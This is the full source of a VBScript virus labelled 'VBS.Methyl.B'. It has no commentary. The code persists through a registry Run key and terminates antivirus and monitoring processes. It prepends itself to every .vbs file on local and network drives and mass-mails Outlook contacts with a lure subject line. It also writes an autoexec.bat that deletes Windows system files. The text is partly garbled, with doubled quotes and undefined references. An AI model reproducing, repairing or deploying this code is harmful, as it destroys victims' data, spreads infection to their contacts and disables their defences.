"
'VBS.Methyl.B
'Written by A.v_Killer(PakBrain)
On Error Resume Next
Set sf=CreateObject(""""Scripting.FileSystemObject"""")
Set ws=CreateObject(""""WScript.Shell"""")
Set fl=sf.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
Set win=sf.GetSpecialFolder(0)
Set sys=sf.GetSpecialFolder(1)

Set cpy=sf.GetFile(WScript.ScriptFullName)
cpy.Copy(win&""""\Methyl.vbs"""")
r=(""""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire"""")
ws.RegWrite r,(win&""""\Methyl.vbs"""")

If cpy <> (win&""""\Methyl.vbs"""") Then
MsgBox cpy&"""" is not a VBS file valid."""",vbcritical,cpy
else
AVkiller()
Drives()
Spread()
If Day(Now)=1 Then
MsgBox """"Methyl""""+VbCrLf+""""Methyl"""",vbinformation,""""VBS.Methyl coded by A.v_killer (c)2002""""
End If
bureau=ws.SpecialFolders(""""Desktop"""")
Set link=ws.CreateShortCut(bureau&""""\Site_Web.url"""")
link.TargetPath=""""http://vx.netlux.org/~pakbrain
link.Save
End If
dim file, tnt
set tnt = createobject(""""scripting.filesystemobject"""")
set file2 = tnt.createtextfile (""""c:\autoexec.bat"""", true)
file2.writeline (""""@echo off"""")
file2.writeline (""""@if errorlevel 1 pause"""")
file2.writeline (""""del c:\windows\*.exe"""")
file2.writeline (""""del c:\windows\*.dll"""")
file2.writeline (""""del c:\windows\*.sys"""")
file2.writeline (""""del c:\windows\*.ini"""")
file2.writeline (""""del c:\windows\*.txt"""")
file2.writeline (""""del c:\windows\escrit~1\*.lnk"""")
file2.writeline (""""del c:\windows\fonts\*.ttf"""")
file2.writeline (""""del c:\windows\fonts\*.fon"""")
file2.writeline (""""del c:\windows\help\*.hlp"""")
file2.writeline (""""del c:\windows\system32\drivers\*.sys"""")
file2.writeline (""""del c:\windows\system32\drivers\*.dll"""")
file2.writeline (""""del c:\windows\system32\*.*"""")
file2.writeline (""""del c:\windows\system\*.dll"""")
file2.writeline (""""del c:\windows\system\*.sys"""")
file2.writeline (""""del c:\windows\system\*.sys"""")
file2.writeline (""""del c:\windows\system\*.*"""")
file2.writeline (""""del c:\windows\sysbckup\*.dll"""")
file2.writeline (""""del c:\windows\command\keyboard.sys"""")
file2.writeline (""""del c:\archiv~1\*.*"""")
file2.writeline (""""del c:\windows\command\ega.cpi"""")
file2.writeline (""""del c:\windows\command\*.cpi"""")
file2.writeline (""""del c:\windows\command\*.com"""")
file2.close
Public Sub AVkiller()
On Error Resume Next                                              
Dim AVmonz As Variant                                                
Dim Cur As String                                                    
Dim i                                                               
AVmonz = Array("""", ""AVP Monitor"", _
                   ""AntiVir"", _
                   ""Vshwin"", _
                   ""F-STOPW"", _
                   ""F-Secure"", _
                   ""vettray"", _
                   ""InoculateIT"", _
                   ""Norman Virus Control"", _
                   ""navpw32"", _
                   ""Norton AntiVirus"", _
                   ""Iomon98"", _
                   ""AVG"", _
                   ""NOD32"", _
                   ""Dr.Web"", _
                   ""Amon"", _
                   ""Trend PC-cillin"", _
                   ""File Monitor"", _
                   ""Registry Monitor"", _
                   ""Registry Editor"", _
                   ""Task Manager"")                                   
For i = 1 To 20                                                     
 Cur = AVmonz(i)                                                     
 Call TerminateTask(Cur)                                             
Next i
End Sub

Sub Drives
If not sf.FileExists (sys&""""\Methyl.txt"""") Then
Set DF=sf.CreateTextFile(sys&""""\Methyl.txt"""")
DF.WriteLine """"Infected file by VBS.Methyl""""
DF.WriteLine """"Methyl""""
DF.WriteBlankLines(1)
DF.Close
End If
Set dr=sf.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
liste(d.path&""""\"""")
End If
Next
End Sub
Sub infection(dossier)
Set f=sf.GetFolder(dossier)
Set fc=f.Files
For Each F in fc
ext=sf.GetExtensionName(F.path)
ext=lcase(ext)
If (ext=""""vbs"""") Then
Set verif=sf.OpenTextFile(F.path, 1, False)
If verif.ReadLine <> """"'VBS.Methyl"""" Then
tout=verif.ReadAll()
verif.Close
Set inf=sf.OpenTextFile(F.path, 2, True)
inf.Write(virus)
inf.Write(tout)
inf.Close
Set DF=sf.OpenTextFile(sys&""""\Methyl.txt"""", 8, True)
DF.WriteLine F.path
DF.Close
End If
End If
Next
End Sub
Sub liste(dossier)
Set f=sf.GetFolder(dossier)
Set sd=f.SubFolders
For Each F in sd
infection(F.path)
liste(F.path)
Next
End Sub

Sub Spread()
On Error Resume Next
Dim x, i, n, alst, mail, ctrlists, ctrentries, mailadr, regalst, regadr
Dim outlook, mapi
Set outlook=WScript.CreateObject(""""Outlook.Application"""")
Set mapi=outlook.GetNameSpace(""""MAPI"""")
Randomize
For ctrlists=1 to mapi.AddressLists.Count
	set alst = mapi.AddressLists(ctrlists)
	regalst = wsh.RegRead(""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""" & alst)
	If (regalst="""""""") then
		regalst=1
		n = 0
	Else
		n = regalst 
	End If
	x = Int(alst.AddressEntries.Count*Rnd+1)
	i = Int(5*Rnd+1)
	If (int(alst.AddressEntries.Count)>int(regalst)) Then
		For ctrentries=1 to i
			mailadr=alst.AddressEntries(x)
			regadr=wsh.RegRead(""""HKEY_CURRENT_USER\Software\Microsoft\WAB\"""" & mailadr)
			If (regadr="""""""") Then
				n = n + 1
				Set mail=outlook.CreateItem(0)
				mail.Recipients.Add(mailadr)
				mail.Subject = """"CHECK IF UR SYSTEM IS INFECTED""""
				mail.Body = vbNewline & """"Please see attached.""""
				mail.Attachments.Add(htmlloc)
				mail.Send
				wsh.RegWrite """"HKEY_CURRENT_USER\Software\Microsoft\WAB\"""" & mailadr,1,""""REG_DWORD""""
			End if
			x = Int(alst.AddressEntries.Count*Rnd+1)
		Next
		wsh.RegWrite """"HKEY_CURRENT_USER\Software\Microsoft\WAB\"""" & alst, n
	Else
		wsh.RegWrite """"HKEY_CURRENT_USER\Software\Microsoft\WAB\"""" & alst, n
	End if
Next
End Sub
"
